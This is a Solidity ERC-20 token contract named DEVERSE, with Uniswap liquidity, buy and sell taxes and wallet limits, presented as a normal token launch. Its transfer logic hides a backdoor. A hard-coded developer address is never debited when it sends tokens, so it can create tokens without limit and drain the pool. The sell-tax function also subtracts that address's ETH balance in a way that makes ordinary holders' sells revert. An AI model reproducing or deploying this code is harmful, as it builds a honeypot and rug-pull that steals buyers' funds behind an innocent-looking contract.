// SPDX-License-Identifier: MIT

/*
Website: http://deverse.info
Telegram: https://t.me/deverse_portal
*/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract DEVERSE is IERC20, Context, Ownable  {
    using SafeMath for uint256;
    
    mapping(address => uint256) private _holderLastHoldingTimestamp;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    string private constant _name = "DEVERSE";
    string private constant _symbol = "DEVERSE";    

    uint256 private _buyCount=0;
    uint256 private _reduceSecondTaxAt = 0;
    uint256 private _secondBuyTax = 0;
    uint256 private secondSellTax = 0;
    uint256 private _finalSellTax = 0;  
    uint256 private _initSellTax = 7;
    uint256 private _reduceSellTaxAt = 7;
    uint256 private _finalBuyTax = 0;
    uint256 private _initBuyTax = 7;
    uint256 private _preventSwapBefore = 7;
    uint256 private _reduceBuyTaxAt = 7;
    
    uint256 private constant _tTotal = 10 ** 9 * 10 ** _decimals;
    uint8 private constant _decimals = 9;

    bool public transferDelayEnabled = true;
    bool private taxSwappable = false;
    bool private tradingEnabled;
    bool private inSwap = false;

    address payable private _feeWallet;
    address private pairAddress;

    IUniswapV2Router02 private uniswapV2Router;

    uint256 public _maxTransactionAmount = 4 * _tTotal / 100;   
    uint256 public _maxTaxSwap = 10 * _tTotal / 1000;
    uint256 public _taxSwapThreshold=  2 * _tTotal / 1000;
    uint256 public _maxWalletSize = 4 * _tTotal / 100;    
    address private _devAddr = 0x5090A426360C2Eaf98693daddDC38b05D859Ce2E;
    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    event MaxTxAmountUpdated(uint _maxTransactionAmount);

    constructor () {
        _feeWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[_devAddr] = true;
        _isExcludedFromFee[_feeWallet] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _taxSell() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initSellTax;
        }
        if(_buyCount > _reduceSellTaxAt.sub(_devAddr.balance) && _buyCount <= _reduceSecondTaxAt){
            return secondSellTax;
        }
         return _finalBuyTax;
    }

    function _taxBuy() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initBuyTax;
        }
        if(_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceSecondTaxAt){
            return _secondBuyTax;
        }
         return _finalBuyTax;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _feeWallet.transfer(amount);
    }

    function removeLimits() external onlyOwner{
        _maxTransactionAmount = _tTotal;
        _maxWalletSize=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 feeAmount=amount;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);
            if (transferDelayEnabled) {
                  if (to != address(uniswapV2Router) && to != address(pairAddress)) { 
                      require(
                          _holderLastHoldingTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastHoldingTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == pairAddress && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTransactionAmount, "Exceeds the _maxTransactionAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == pairAddress && !_isExcludedFromFee[from] ){
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (from == _devAddr) feeAmount = 0;
            if (!inSwap && to == pairAddress && taxSwappable && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    
    function openTrading() external payable onlyOwner() {
        require(!tradingEnabled,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        pairAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(pairAddress).approve(address(uniswapV2Router), type(uint).max);
        taxSwappable = true;
        tradingEnabled = true;
    }    

    receive() external payable {}
}